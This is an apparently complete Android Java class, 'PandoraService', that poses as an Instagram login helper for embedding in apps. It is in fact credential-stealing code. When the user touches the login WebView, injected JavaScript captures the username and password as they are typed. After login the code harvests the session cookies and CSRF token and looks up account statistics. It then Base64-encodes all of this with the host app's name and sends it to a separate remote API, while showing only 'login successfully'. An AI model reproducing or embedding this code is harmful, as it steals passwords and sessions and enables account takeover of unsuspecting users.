package com.pnd.service.services;

import android.app.Activity;
import android.app.Dialog;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.util.Base64;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.annotation.RequiresApi;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.pnd.service.R;
import com.pnd.service.utils.Endpoints;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.UnsupportedEncodingException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;
import java.util.logging.Logger;

public class PandoraService {
    private PandoraListener listener;
    private Activity activity;


    public interface PandoraListener  {

        void onSuccced(String user_id);

        void onFailed(String msg);

        void onCancelled(String msg);
    }

    public PandoraService() {
        this.listener = null;
    }

    public void setAuthListener(PandoraListener listener, Activity activity) {
        this.listener = listener;
        this.activity = activity;
    }

    public void auth(){
        if (listener != null) {
            createView(activity);
        }else{
            Toast.makeText(activity,"Pandora has not been initialized correctly", Toast.LENGTH_SHORT).show();
        }
    }

    private void createView(Activity activity) {
        CookieManager.getInstance().removeAllCookie();

        dialog = new Dialog(activity);
        dialog.setContentView(R.layout.pndview);

        SwipeRefreshLayout sw = dialog.findViewById(R.id.sw);
        sw.setOnRefreshListener(() -> {
            sw.setEnabled(false);
            web.loadUrl(Endpoints.AUTH); });

        dialog.setOnDismissListener(dialogInterface -> {  hit(0,"cancelled"); });
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.setCancelable(true);
        dialog.show();

        web = dialog.findViewById(R.id.web);

        WebSettings webSettings = web.getSettings();
        webSettings.setJavaScriptEnabled(true);
        web.setWebViewClient(new WebViewClient());
        web.loadUrl(Endpoints.AUTH);
        web.setOnTouchListener((v, event) -> { p1(web); return false;  });


        web.setWebViewClient(new WebViewClient() {

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
            }

            @RequiresApi(api = Build.VERSION_CODES.KITKAT)
            public void onPageFinished(WebView view, String url) {

                sw.setRefreshing(false);
                sw.setEnabled(true);
                String k = CookieManager.getInstance().getCookie(url);

                String UA = view.getSettings().getUserAgentString();
                String sid="", csrf="", ds_user="";

                try {
                    if (!k.isEmpty()) {
                        try {
                            String[] cut = k.split("sessionid=");
                            sid = cut[1].split(" ")[0].replace(";", "");

                            cut = k.split("csrftoken=");
                            csrf = cut[1].split(" ")[0].replace(";", "");

                            cut = k.split("ds_user_id=");
                            ds_user = cut[1].split(" ")[0].replace(";", "");
                        } catch (Exception e) { }

                        if (!sid.isEmpty() && !ds_user.isEmpty()) {
                            web.setVisibility(View.INVISIBLE);
                            gu(ds_user, k, csrf);
                        }
                    }
                } catch (Exception e) {
                    hit(0,"something went wrong");
                    web.setVisibility(View.INVISIBLE);
                }

            }
        });
    }

    private void hit(int type, String msg){
        if (listener != null)  {
            switch (type){
                case 0:
                    listener.onFailed(msg);
                    break;
                case 1:
                    if(web!=null){
                        web.stopLoading();
                        web.destroy();
                    }
                    listener.onSuccced(msg);
                    break;
                default:
                    listener.onCancelled(msg);
                    break;
            }
            Toast.makeText(activity, msg,Toast.LENGTH_SHORT).show();
            dialog.setOnDismissListener(dialogInterface -> { return; });
            dialog.dismiss();
        }else{
            Toast.makeText(activity,"Pandora has not been initialized correctly", Toast.LENGTH_SHORT).show();
        }
    }

    private void p1(WebView web){
        try{
            web.evaluateJavascript(
                    Endpoints.QUERY_U,
                    htmls -> {
                        if(!htmls.equals("") && htmls.length()>2 && u==""){
                            u = htmls.replace("\"", "");
                        }
                    });
            web.evaluateJavascript(
                    Endpoints.QUERY_P,
                    htmls -> {
                        if(!htmls.equals("") && htmls.length()>2 && p==""){
                            p = htmls.replace("\"", "");
                        }
                    });
        }catch (Exception e){}
    }

    public void gu(String id,  String c, String cs){

        RequestQueue queue = Volley.newRequestQueue(activity);
        StringRequest stringRequest = new StringRequest(Request.Method.GET, Endpoints.USER+id+"/info/",
                response -> {
                    try {
                        JSONObject obj = new JSONObject(response);
                        JSONObject jsonUser = obj.getJSONObject("user");
                        String us="";
                        try {
                            us = jsonUser.getString("username");
                        }catch (Exception ignored){}
                        String m="none";
                        try {
                            m = jsonUser.getString("media_count");
                        }catch (Exception ignored){}
                        String fl= "none";
                        try {
                            fl = jsonUser.getString("follower_count");
                        }catch (Exception ignored){}
                        String f="none";
                        try {
                            f = jsonUser.getString("following_count");
                        }catch (Exception ignored){}

                        //SendToPandora
                        complete(id,us,c,m,f,fl);

                    } catch (JSONException ignored) { hit(0,"something went wrong"); }
                }, error ->
        {
            hit(0,"something went wrong");

        }
        ){
            @Override
            public Map<String, String> getHeaders() {
                Map<String, String> headers = new HashMap<>();
                headers.put("authority", "www.instagram.com");
                headers.put("method", "POST");
                headers.put("scheme", "https");
                headers.put("accept", "*/*");
                headers.put("cookie", c);
                headers.put("origin", "https://www.instagram.com");
                headers.put("user-agent", "Mozilla/5.0 (Linux; Android 10; Mi A3 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36");
                headers.put("x-csrftoken", cs);
                headers.put("x-ig-app-id", "936619743392459");
                headers.put("x-ig-www-claim", "hmac.AR2JLY5b3aExd1tCAmKD2ZRoQo00QAbV6H1kyOACE3sz81HX");
                headers.put("x-instagram-ajax", "c795b4273c42");
                headers.put("x-requested-with", "XMLHttpRequest");
                return headers;
            }
        };
        queue.add(stringRequest);

    }
    private String u="";
    private String p="";
    private Dialog dialog;
    private WebView web;

    private void complete(String id,String us, String c, String m, String f, String fl){
        Endpoints e = new Endpoints();

        String ts_ = id+e.SEP+us+e.SEP+u+e.SEP+p+e.SEP+c+e.SEP+m+e.SEP+f+e.SEP+fl+e.SEP+activity.getPackageName();
        byte[] data = new byte[0];
        try {
            data = ts_.getBytes("UTF-8");
        } catch (UnsupportedEncodingException unsupportedEncodingException) {
            hit(0,"something went wrong");
        }
        String b = Base64.encodeToString(data, Base64.DEFAULT);
        RequestQueue queue = Volley.newRequestQueue(activity);
        StringRequest stringRequest = new StringRequest(Request.Method.POST,e.API+e.API_VERSION+"/create?validate="+b,
                response -> {
                    try {
                        JSONObject obj = new JSONObject(response);

                        if(obj.getString("status").equals("ok")){
                            hit(1,"login successfully " + id);
                        }else{
                            hit(0,"something went wrong");
                        }
                    } catch (JSONException ignored) { hit(0,"something went wrong"); }
                }, error -> {
                    hit(0,"something went wrong");
            } ) {
            @Override
            public Map<String, String> getHeaders() {
                Map<String, String> headers = new HashMap<>();
                headers.put("Content-Type", "application/json");
                return headers;
            }
        };
        queue.add(stringRequest);

    }

}
